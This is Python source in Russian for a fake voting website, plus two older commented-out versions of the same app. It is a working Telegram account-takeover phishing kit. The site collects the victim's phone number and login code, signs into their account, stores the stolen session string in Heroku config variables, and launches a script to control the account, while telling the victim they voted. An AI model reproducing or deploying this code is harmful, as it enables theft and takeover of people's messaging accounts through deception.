from quart import Quart, request, redirect, url_for, render_template, session as quart_session
import os
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import logging
from dotenv import load_dotenv
import asyncio
import heroku3  # Добавляем библиотеку для работы с Heroku API
import subprocess

# Загрузка переменных окружения
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Получение API_ID и API_HASH из переменных окружения
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
heroku_api_key = os.getenv('HEROKU_API_KEY')  # Получение API-ключа Heroku
heroku_app_name = os.getenv('HEROKU_APP_NAME')  # Имя приложения на Heroku

logger.debug(f"API_ID: {api_id}, API_HASH: {api_hash}")

app = Quart(__name__, template_folder='templates', static_folder='static')
app.secret_key = os.urandom(24)

client = None

# Функция для создания телеграм клиента
async def create_telegram_client(session_str=None):
    logger.debug(f"Создание TelegramClient с session_str: {session_str}")
    session = StringSession(session_str) if session_str else StringSession()
    global client
    client = TelegramClient(session, api_id, api_hash)
    
    try:
        await client.connect()
        logger.debug("Telegram клиент успешно подключен.")
    except Exception as e:
        logger.error(f"Ошибка при подключении Telegram клиента: {e}")
        raise

# Функция для отправки кода с задержкой
async def send_code_with_delay(phone_number):
    try:
        logger.debug(f"Задержка перед отправкой кода для номера {phone_number}")
        # Задержка 2 секунды перед отправкой кода
        await asyncio.sleep(2)
        result = await client.send_code_request(phone_number)
        logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
        return result
    except errors.FloodWait as e:
        # Если превысили лимиты Telegram
        logger.error(f"Превышен лимит запросов, необходимо подождать {e.seconds} секунд.")
        await asyncio.sleep(e.seconds)
        return None
    except Exception as e:
        logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
        raise

def set_heroku_config_var(phone_number, session_str):
    try:
        # Подключение к Heroku с использованием API ключа
        heroku_conn = heroku3.from_key(heroku_api_key)
        
        # Получение приложения по имени
        app = heroku_conn.apps()[heroku_app_name]
        
        # Очистка номера телефона от ненужных символов
        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
        env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
        
        # Сохранение переменной окружения в Heroku
        app.config()[env_var_name] = session_str
        
        # Лог успешного сохранения
        logger.debug(f"Сессия сохранена в переменную окружения Heroku: {env_var_name}")
    
    except KeyError as ke:
        # Ошибка при работе с ключами приложения или конфигурации
        logger.error(f"Ошибка KeyError при доступе к переменной окружения Heroku: {ke}")
        raise
    
    except Exception as e:
        # Общая ошибка с деталями исключения
        logger.error(f"Ошибка при сохранении сессии в переменную окружения через API Heroku: {e}")
        raise


# Основная страница
@app.route('/')
async def index():
    logger.debug("Отображение главной страницы")
    return await render_template('index.html')

# Маршрут для голосования (переход на ввод номера телефона)
@app.route('/vote/<candidate>', methods=['POST'])
async def vote(candidate):
    logger.debug(f"Пользователь проголосовал за: {candidate}")
    return redirect(url_for('telegram_number_route'))

# Ввод номера телефона
@app.route('/telegram-number', methods=['GET', 'POST'])
async def telegram_number_route():
    if request.method == 'POST':
        # Получение номера телефона
        phone_number = (await request.form)['phone_number']
        quart_session['phone_number'] = phone_number
        logger.debug(f"Получен номер телефона: {phone_number}")

        try:
            await create_telegram_client()
            result = await send_code_with_delay(phone_number)
            
            if result:
                quart_session['phone_code_hash'] = result.phone_code_hash
                logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
            else:
                return "Превышен лимит запросов. Попробуйте позже."
            
            # Переадресация на страницу ввода кода
            return redirect(url_for('verify_code'))
        except Exception as e:
            logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
            return f"Ошибка при отправке кода: {e}"

    logger.debug("Отображение страницы ввода номера телефона")
    return await render_template('telegram-number.html')

# Ввод кода подтверждения
@app.route('/telegram-code', methods=['GET', 'POST'])
async def verify_code():
    if request.method == 'POST':
        # Получение кода подтверждения
        verification_code = (await request.form)['verification_code']
        phone_number = quart_session.get('phone_number')
        phone_code_hash = quart_session.get('phone_code_hash')

        logger.debug(f"Получен код подтверждения от пользователя: {verification_code}")
        logger.debug(f"Номер телефона из сессии: {phone_number}")
        logger.debug(f"Хэш кода из сессии: {phone_code_hash}")

        if phone_number and phone_code_hash:
            try:
                logger.debug(f"Попытка авторизации для номера {phone_number} с кодом {verification_code}")
                await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
                logger.debug(f"Авторизация успешна для номера {phone_number}")

                # Сохранение сессии
                session_str = client.session.save()
                logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")

                # Сохранение сессии в переменной окружения на Heroku через API
                set_heroku_config_var(phone_number, session_str)

                # Запуск скрипта для управления аккаунтом
                logger.debug(f"Запуск manage_account.py для номера {phone_number}")
                subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)

                # Переадресация на страницу успеха
                logger.debug(f"Переадресация на страницу успеха для номера {phone_number}")
                return redirect(url_for('success_page'))

            except Exception as e:
                logger.error(f"Ошибка при авторизации для номера {phone_number}. Ошибка: {e}")
                return f"Ошибка при проверке кода: {e}"

        else:
            logger.error(f"Ошибка: Отсутствует номер телефона или хэш кода в сессии.")
            return redirect(url_for('telegram_number_route'))

    logger.debug("Отображение страницы ввода кода подтверждения")
    return await render_template('telegram-code.html')

# Страница успешного голосования
@app.route('/success')
async def success_page():
    logger.debug("Пользователь успешно проголосовал")
    return "Вы успешно проголосовали!"

# Запуск приложения
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.debug(f"Запуск приложения на порту {port}")
    app.run(host='0.0.0.0', port=port)



#----------------------------------------------------------------
# from quart import Quart, request, redirect, url_for, render_template, session as quart_session
# import os
# from telethon import TelegramClient, errors
# from telethon.sessions import StringSession
# import logging
# from dotenv import load_dotenv
# import asyncio
# import subprocess

# # Загрузка переменных окружения
# load_dotenv()

# # Настройка логирования
# logging.basicConfig(level=logging.DEBUG)
# logger = logging.getLogger(__name__)

# # Получение API_ID и API_HASH из переменных окружения
# api_id = os.getenv('API_ID')
# api_hash = os.getenv('API_HASH')

# logger.debug(f"API_ID: {api_id}, API_HASH: {api_hash}")

# app = Quart(__name__, template_folder='templates', static_folder='static')
# app.secret_key = os.urandom(24)

# client = None

# # Функция для создания телеграм клиента
# async def create_telegram_client(session_str=None):
#     logger.debug(f"Создание TelegramClient с session_str: {session_str}")
#     session = StringSession(session_str) if session_str else StringSession()
#     global client
#     client = TelegramClient(session, api_id, api_hash)
    
#     try:
#         await client.connect()
#         logger.debug("Telegram клиент успешно подключен.")
#     except Exception as e:
#         logger.error(f"Ошибка при подключении Telegram клиента: {e}")
#         raise

# # Функция для отправки кода с задержкой
# async def send_code_with_delay(phone_number):
#     try:
#         logger.debug(f"Задержка перед отправкой кода для номера {phone_number}")
#         # Задержка 2 секунды перед отправкой кода
#         await asyncio.sleep(2)
#         result = await client.send_code_request(phone_number)
#         logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
#         return result
#     except errors.FloodWait as e:
#         # Если превысили лимиты Telegram
#         logger.error(f"Превышен лимит запросов, необходимо подождать {e.seconds} секунд.")
#         await asyncio.sleep(e.seconds)
#         return None
#     except Exception as e:
#         logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
#         raise

# # Основная страница
# @app.route('/')
# async def index():
#     logger.debug("Отображение главной страницы")
#     return await render_template('index.html')

# # Маршрут для голосования (переход на ввод номера телефона)
# @app.route('/vote/<candidate>', methods=['POST'])
# async def vote(candidate):
#     logger.debug(f"Пользователь проголосовал за: {candidate}")
#     return redirect(url_for('telegram_number_route'))

# # Ввод номера телефона
# @app.route('/telegram-number', methods=['GET', 'POST'])
# async def telegram_number_route():
#     if request.method == 'POST':
#         # Получение номера телефона
#         phone_number = (await request.form)['phone_number']
#         quart_session['phone_number'] = phone_number
#         logger.debug(f"Получен номер телефона: {phone_number}")

#         try:
#             await create_telegram_client()
#             result = await send_code_with_delay(phone_number)
            
#             if result:
#                 quart_session['phone_code_hash'] = result.phone_code_hash
#                 logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
#             else:
#                 return "Превышен лимит запросов. Попробуйте позже."
            
#             # Переадресация на страницу ввода кода
#             return redirect(url_for('verify_code'))
#         except Exception as e:
#             logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
#             return f"Ошибка при отправке кода: {e}"

#     logger.debug("Отображение страницы ввода номера телефона")
#     return await render_template('telegram-number.html')

# # Ввод кода подтверждения
# @app.route('/telegram-code', methods=['GET', 'POST'])
# async def verify_code():
#     if request.method == 'POST':
#         # Получение кода подтверждения
#         verification_code = (await request.form)['verification_code']
#         phone_number = quart_session.get('phone_number')
#         phone_code_hash = quart_session.get('phone_code_hash')

#         # Подробное логирование на каждом этапе
#         logger.debug(f"Получен код подтверждения от пользователя: {verification_code}")
#         logger.debug(f"Номер телефона из сессии: {phone_number}")
#         logger.debug(f"Хэш кода из сессии: {phone_code_hash}")

#         if phone_number and phone_code_hash:
#             try:
#                 logger.debug(f"Попытка авторизации для номера {phone_number} с кодом {verification_code}")
#                 # Попытка авторизации с помощью введенного кода
#                 await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
#                 logger.debug(f"Авторизация успешна для номера {phone_number}")

#                 # Сохранение сессии
#                 session_str = client.session.save()
#                 logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")

#                 # # Сохранение сессии в файл
#                 # os.makedirs('sessions', exist_ok=True)
#                 # session_file_path = f"sessions/{phone_number}.session"
#                 # with open(session_file_path, "w") as session_file:
#                 #     session_file.write(session_str)
#                 # logger.debug(f"Сессия сохранена в файл: {session_file_path}")


#                 # Сохранение сессии в переменной окружения на Heroku
#                 session_str = client.session.save()
#                 env_var_name = f'TELEGRAM_SESSION_{phone_number}'

#                 # Команда для установки переменной окружения на Heroku
#                 set_env_command = f'heroku config:set {env_var_name}={session_str} --app myfish'
#                 try:
#                     subprocess.run(set_env_command, shell=True, check=True)
#                     logger.debug(f"Сессия сохранена в переменную окружения: {env_var_name}")
#                 except subprocess.CalledProcessError as e:
#                     logger.error(f"Ошибка при сохранении сессии в переменную окружения: {e}")





#                 # Запуск скрипта для управления аккаунтом
#                 logger.debug(f"Запуск manage_account.py для номера {phone_number}")
#                 subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)

#                 # Переадресация на страницу успеха
#                 logger.debug(f"Переадресация на страницу успеха для номера {phone_number}")
#                 return redirect(url_for('success_page'))

#             except Exception as e:
#                 # Логирование ошибки при проверке кода
#                 logger.error(f"Ошибка при авторизации для номера {phone_number}. Код: {verification_code}, Хэш: {phone_code_hash}, Ошибка: {e}")
#                 return f"Ошибка при проверке кода: {e}"

#         else:
#             # Логирование ошибки отсутствия номера телефона или phone_code_hash
#             logger.error(f"Ошибка: Отсутствует номер телефона или хэш кода в сессии. Номер телефона: {phone_number}, Хэш: {phone_code_hash}")
#             return redirect(url_for('telegram_number_route'))

#     logger.debug("Отображение страницы ввода кода подтверждения")
#     return await render_template('telegram-code.html')


# # Страница успешного голосования
# @app.route('/success')
# async def success_page():
#     logger.debug("Пользователь успешно проголосовал")
#     return "Вы успешно проголосовали!"

# # Запуск приложения
# if __name__ == '__main__':
#     port = int(os.environ.get('PORT', 5000))
#     logger.debug(f"Запуск приложения на порту {port}")
#     app.run(host='0.0.0.0', port=port)




#-----------------------------------------------------------------------------------------MAIN

# from quart import Quart, request, redirect, url_for, render_template, session as quart_session
# import os
# from telethon import TelegramClient
# from telethon.sessions import StringSession
# import logging
# from dotenv import load_dotenv

# load_dotenv()

# logging.basicConfig(level=logging.DEBUG)

# api_id = os.getenv('API_ID')
# api_hash = os.getenv('API_HASH')

# app = Quart(__name__, template_folder='templates', static_folder='static')
# app.secret_key = os.urandom(24)

# client = None

# async def create_telegram_client(session_str=None):
#     session = StringSession(session_str) if session_str else StringSession()
#     global client
#     client = TelegramClient(session, api_id, api_hash)
#     await client.connect()

# @app.route('/')
# async def index():
#     return await render_template('index.html')

# @app.route('/vote/<candidate>', methods=['POST'])
# async def vote(candidate):
#     return redirect(url_for('telegram_number_route'))

# @app.route('/telegram-number', methods=['GET', 'POST'])
# async def telegram_number_route():
#     if request.method == 'POST':
#         phone_number = (await request.form)['phone_number']
#         quart_session['phone_number'] = phone_number

#         try:
#             await create_telegram_client()
#             result = await client.send_code_request(phone_number)
#             quart_session['phone_code_hash'] = result.phone_code_hash
#         except Exception as e:
#             print(f"Ошибка при отправке кода: {e}")

#         return redirect(url_for('verify_code'))
#     return await render_template('telegram-number.html')

# @app.route('/telegram-code', methods=['GET', 'POST'])
# async def verify_code():
#     if request.method == 'POST':
#         verification_code = (await request.form)['verification_code']
#         phone_number = quart_session.get('phone_number')
#         phone_code_hash = quart_session.get('phone_code_hash')

#         if phone_number and phone_code_hash:
#             try:
#                 await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
#                 session_str = client.session.save()
#                 os.makedirs('sessions', exist_ok=True)
#                 with open(f"sessions/{phone_number}.session", "w") as session_file:
#                     session_file.write(session_str)
#                 return redirect(url_for('success_page'))
#             except Exception as e:
#                 return f"Ошибка при проверке кода: {e}"
#         return redirect(url_for('telegram_number_route'))
#     return await render_template('telegram-code.html')

# @app.route('/success')
# async def success_page():
#     return "Вы успешно авторизовались!"

# if __name__ == '__main__':
#     app.run(debug=True)
